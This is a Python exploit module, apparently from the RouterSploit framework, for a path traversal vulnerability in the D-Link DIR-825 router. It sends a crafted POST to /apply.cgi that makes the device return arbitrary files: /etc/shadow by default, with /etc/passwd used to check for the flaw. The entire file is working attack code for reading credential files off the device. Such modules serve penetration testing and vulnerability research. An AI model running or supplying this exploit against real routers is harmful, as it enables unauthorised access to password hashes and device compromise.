from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DIR-825 Path Traversal",
        "description": "Module exploits D-Link DIR-825 path traversal vulnerability, which allows reading files from the device.",
        "authors": (
            "Samuel Huntley",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/38718/",
        ),
        "devices": (
            "D-Link DIR-825",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    filename = OptString("/etc/shadow", "File to read")  # file to read
    username = OptString("admin", "Username to log in with")  # username - default: admin
    password = OptString("", "Password to log in with")  # password - default: blank

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")
            file_path = "..{}".format(self.filename)

            data = {
                "html_response_page": file_path,
                "action": "do_graph_auth",
                "login_name": "test",
                "login_pass": "test1",
                "&login_n": "test2",
                "log_pass": "test3",
                "graph_code": "63778",
                "session_id": "test5",
                "test": "test"
            }

            print_status("Sending request payload using credentials: {} / {}".format(self.username, self.password))
            response = self.http_request(
                method="POST",
                path="/apply.cgi",
                data=data,
                auth=(self.username, self.password)
            )
            if response is None:
                return

            if response.status_code == 200:
                print_status("File: {}".format(self.filename))
                print_info(response.text)
            else:
                print_error("Exploit failed - could not read response")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        data = {
            "html_response_page": "/etc/passwd",
            "action": "do_graph_auth",
            "login_name": "test",
            "login_pass": "test1",
            "&login_n": "test2",
            "log_pass": "test3",
            "graph_code": "63778",
            "session_id": "test5",
            "test": "test"
        }

        response = self.http_request(
            method="POST",
            path="/apply.cgi",
            data=data,
            auth=(self.username, self.password)
        )
        if response is None:
            return False  # target is not vulnerable

        if utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target vulnerable

        return False  # target not vulnerable
